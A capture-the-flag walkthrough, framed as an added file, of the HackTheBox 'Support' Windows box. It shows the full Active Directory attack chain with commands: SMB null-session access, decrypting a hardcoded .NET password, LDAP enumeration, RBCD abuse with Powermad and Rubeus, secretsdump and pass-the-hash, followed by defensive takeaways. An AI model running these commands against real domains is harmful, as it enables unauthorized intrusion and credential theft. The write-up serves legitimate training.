@@ -1,0 +1,31 @@
+Welcome, security professionals. Today we walk through the HackTheBox Support machine, an easy-rated Windows box that demonstrates how a series of misconfigurations can lead to full domain compromise. We’ll cover service discovery, initial access, privilege escalation, and the key takeaways for defenders.
+
+We begin with enumeration. Using nmap with the flags -sC -sV -oN support.nmap, we scan the target to identify open ports and service versions. The results show SMB on ports 139 and 445, LDAP on 389, and WinRM on 5985. These are the most interesting services: SMB for file sharing, LDAP for directory queries, and WinRM for remote management.
+
+Next, we enumerate SMB shares using smbclient with the -L flag to list shares and -N to attempt a null session. We run smbclient -L //target -N and discover a share named support-tools. Connecting to it with smbclient //target/support-tools -N, we list its contents and find UserInfo.exe.zip. We download it using get, exit the SMB shell, and extract the archive with unzip.
+
+Inside, we find UserInfo.exe, a .NET binary. Since compiled .NET code can be easily reversed, we use ILSpy to decompile it. After downloading and running ILSpy-linux-x64, we open UserInfo.exe and navigate to UserInfo.Services.Protected. There, we see a static method getPassword() that decrypts an encoded password using XOR with a static key "armando" and a constant 0xDF. The encrypted password is stored in a Base64 string.
+
+We write a Python script to replicate the decryption: base64-decode the string, then XOR each byte with the repeating key "armando", followed by XOR with 0xDF. The script outputs the plaintext LDAP password. Important note: when using this password in bash, we must wrap it in single quotes to prevent the shell from interpreting $ symbols as variables.
+
+With the ldap user credentials, we perform LDAP enumeration using ldapsearch. We run ldapsearch -x -H ldap://target -D "ldap@support.htb" -w '<password>' -b "DC=support,DC=htb" "(sAMAccountName=support)", using single quotes around the password to avoid shell expansion. The query returns the support user’s info field, which contains their plaintext password—a critical misconfiguration, as AD attributes like info are readable by any authenticated user.
+
+Now we have credentials for the support user. We use evil-winrm to gain a shell: evil-winrm -i target -u support -p '<password>'. Inside the PowerShell session, we retrieve the user flag from the desktop.
+
+We then run whoami /all to assess our privileges. The output shows we belong to the group "Shared Support Accounts" and have the SeMachineAccountPrivilege enabled, which allows us to create computer accounts in the domain.
+
+To understand our rights, we upload and import PowerView.ps1. We verify it works with Get-NetUser support. Then we check the ACL on the Domain Controller using Get-DomainObjectAcl -Identity "DC$" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match "1103"}. The 1103 corresponds to the Shared Support Accounts group’s SID. The result shows GenericAll rights over the DC object—meaning our group has full control.
+
+With GenericAll over a computer object, we can abuse Resource-Based Constrained Delegation (RBCD). We upload and import Powermad.ps1, then create a machine account we control: New-MachineAccount -MachineAccount "FakeComputer" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force). We note the computer’s SID for the next step.
+
+We configure RBCD on the DC by setting the msds-allowedtoactonbehalfofotheridentity attribute. We do this in separate PowerShell lines to avoid parsing errors: first, we create a raw security descriptor granting our FakeComputer SID the necessary rights, convert it to binary, then apply it to the DC object using Set-DomainObject.
+
+Now we need a Kerberos ticket to impersonate the Administrator. We upload Rubeus.exe and calculate the NTLM hash of FakeComputer’s password using Python: python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','Password123!'.encode('utf-16le')).digest()).decode())". We then run Rubeus.exe s4u /user:FakeComputer$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /nowrap to request a service ticket for the Administrator.
+
+We copy the Base64-encoded ticket from the output, decode it on our Kali machine with base64 -d, then convert it from .kirbi to .ccache format using impacket-ticketConverter. We set KRB5CCNAME to point to the cache and run impacket-secretsdump -k -no-pass dc.support.htb to extract the Administrator’s NTLM hash.
+
+Finally, we use Pass-the-Hash with evil-winrm: evil-winrm -i target -u Administrator -H <admin_ntlm_hash>. Inside the shell, we retrieve the root flag from the Administrator’s desktop.
+
+To recap the attack chain: anonymous SMB access led to a decompiled .NET binary revealing LDAP credentials; those credentials exposed a password in an LDAP info field; WinRM gave us initial access; our user’s SeMachineAccountPrivilege and group membership allowed us to discover GenericAll over the DC via PowerView; we abused RBCD by creating a machine account, configuring delegation, forging a Kerberos ticket, dumping secrets, and passing the hash for domain admin.
+
+Key takeaway: Never store credentials in .NET applications or AD attributes accessible to authenticated users. Restrict SeMachineAccountPrivilege and monitor for GenericAll rights on critical objects like Domain Controllers. Even seemingly harmless privileges can chain into full compromise when combined with delegation misconfigurations. Defend by assuming breach, least privilege, and continuous AD hardening. Stay vigilant.
